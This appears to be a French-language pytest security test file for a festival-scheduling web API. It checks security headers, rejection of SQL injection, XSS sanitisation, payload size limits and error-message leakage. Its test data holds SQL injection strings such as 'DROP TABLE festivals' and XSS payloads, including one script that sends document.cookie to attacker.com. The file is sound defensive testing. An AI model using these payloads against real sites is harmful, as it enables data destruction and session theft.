import pytest
from app.adapters.primary.security.sanitizer import InputSanitizer


# =====================================================================
# 1. Tests des En-têtes de Sécurité HTTP (OWASP Security Headers)
# =====================================================================

def test_security_headers_present_on_endpoints(client):
    """Vérifie que les en-têtes de sécurité recommandés par l'OWASP sont présents sur toutes les réponses."""
    response = client.get("/")
    assert response.status_code == 200

    headers = response.headers
    # Anti-sniffing
    assert headers.get("X-Content-Type-Options") == "nosniff"
    # Anti-Clickjacking
    assert headers.get("X-Frame-Options") == "DENY"
    # Protection XSS navigateurs
    assert headers.get("X-XSS-Protection") == "1; mode=block"
    # Politique de référencement
    assert headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
    # Content-Security-Policy
    csp = headers.get("Content-Security-Policy", "")
    assert "frame-ancestors 'none'" in csp
    assert "default-src 'self'" in csp


# =====================================================================
# 2. Tests de Non-Régression contre les Injections SQL (SQLi)
# =====================================================================

@pytest.mark.parametrize(
    "sqli_payload",
    [
        "1 OR 1=1",
        "1' OR '1'='1",
        "1; DROP TABLE festivals; --",
        "1 UNION SELECT null, null, null, null",
    ],
)
def test_sqli_in_query_parameters_fails_safe(client, sqli_payload):
    """Vérifie qu'une tentative d'injection SQL dans un paramètre de requête est rejetée en amont par typage strict."""
    r = client.get(f"/concerts?festival_id={sqli_payload}")
    # Doit être rejeté (422 Unprocessable Entity car festival_id attend un entier)
    assert r.status_code == 422


def test_sqli_payload_in_text_body_is_safely_parameterized(client):
    """Vérifie qu'un payload SQL inséré dans un champ textuel est traité comme une chaîne littérale pure et n'altère pas la base."""
    # 1. Créer un artiste dont le nom contient un payload d'injection destructeur
    sqli_name = "Black Metal'); DROP TABLE festivals;--"
    r_artist = client.post(
        "/artists",
        json={"name": sqli_name, "genre": "Black Metal", "required_equipment": []},
    )
    assert r_artist.status_code == 201

    # 2. Vérifier que la table festivals existe toujours et n'a pas été supprimée
    r_fest = client.get("/festivals")
    assert r_fest.status_code == 200

    # 3. Vérifier que le nom a été stocké sous forme de texte inoffensif
    r_check = client.get("/artists")
    assert r_check.status_code == 200
    artist_names = [a["name"] for a in r_check.json()]
    assert any("DROP TABLE" in name for name in artist_names)


# =====================================================================
# 3. Tests de Neutralisation des Injections XSS (Cross-Site Scripting)
# =====================================================================

def test_input_sanitizer_unit():
    """Vérifie le bon fonctionnement du composant InputSanitizer."""
    xss_script = "<script>alert('pwned')</script>Normal text"
    cleaned = InputSanitizer.sanitize_text(xss_script)
    assert "<script>" not in cleaned
    assert "Normal text" in cleaned

    xss_tag = "<img src=x onerror=alert(1)>"
    cleaned_tag = InputSanitizer.sanitize_text(xss_tag)
    # Les chevrons doivent être échappés en entités HTML
    assert "<img" not in cleaned_tag
    assert "&lt;img" in cleaned_tag


def test_xss_injection_in_incident_description_is_sanitized(client):
    """Vérifie qu'une description d'incident contenant du code malveillant XSS est neutralisée à l'enregistrement."""
    # 1. Créer un festival et un concert
    r_fest = client.post(
        "/festivals",
        json={
            "name": "Security Fest",
            "location": "Clisson",
            "start_date": "2027-06-18T10:00:00",
            "end_date": "2027-06-20T23:00:00",
        },
    )
    fest_id = r_fest.json()["id"]

    r_art = client.post(
        "/artists",
        json={"name": "Cyber Band", "genre": "Industrial", "required_equipment": []},
    )
    art_id = r_art.json()["id"]

    r_stage = client.post(
        "/stages",
        json={"festival_id": fest_id, "name": "Main", "capacity": 5000, "available_equipment": []},
    )
    stage_id = r_stage.json()["id"]

    r_concert = client.post(
        "/concerts",
        json={
            "festival_id": fest_id,
            "artist_id": art_id,
            "stage_id": stage_id,
            "start_time": "2027-06-18T14:00:00",
            "end_time": "2027-06-18T15:00:00",
        },
    )
    concert_id = r_concert.json()["id"]

    # 2. Déclarer un incident avec une tentative de Stored XSS
    malicious_description = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>Panne de console"
    r_inc = client.post(
        "/incidents",
        json={
            "concert_id": concert_id,
            "description": malicious_description,
        },
    )
    assert r_inc.status_code == 201
    stored_desc = r_inc.json()["description"]

    # La balise <script> a été éliminée et le contenu inoffensif préservé
    assert "<script>" not in stored_desc
    assert "Panne de console" in stored_desc


# =====================================================================
# 4. Tests Anti-DoS (Dépassement de capacité des payloads)
# =====================================================================

def test_oversized_payload_rejected(client):
    """Vérifie que les chaînes démesurées sont rejetées pour prévenir les attaques par saturation mémoire (DoS)."""
    huge_string = "A" * 5000  # max_length autorisé pour incident est 2000
    r = client.post(
        "/incidents",
        json={
            "concert_id": 1,
            "description": huge_string,
        },
    )
    assert r.status_code == 422


# =====================================================================
# 5. Tests Anti-Fuite d'Informations (Information Disclosure)
# =====================================================================

def test_unhandled_exception_does_not_leak_system_paths(monkeypatch):
    """Vérifie qu'un crash inattendu ne renvoie pas la stack trace ni les chemins de fichiers du serveur."""
    from starlette.testclient import TestClient
    from app.main import app
    from app.api import festivals

    def fake_crash(*args, **kwargs):
        raise RuntimeError("Erreur système critique : C:\\Users\\hugoc\\secret_db.sqlite corrompu")

    # Simuler une panne imprévue
    monkeypatch.setattr(festivals, "FestivalService", fake_crash)

    safe_client = TestClient(app, raise_server_exceptions=False)
    r = safe_client.get("/festivals")
    assert r.status_code == 500
    response_body = r.text

    # Vérifier qu'aucun chemin système ou traceback n'a fuité dans la réponse HTTP client
    assert "Traceback" not in response_body
    assert "C:\\Users" not in response_body
    assert "secret_db" not in response_body
    assert "detail" in r.json()
    assert "sécurisée" in r.json()["detail"].lower()

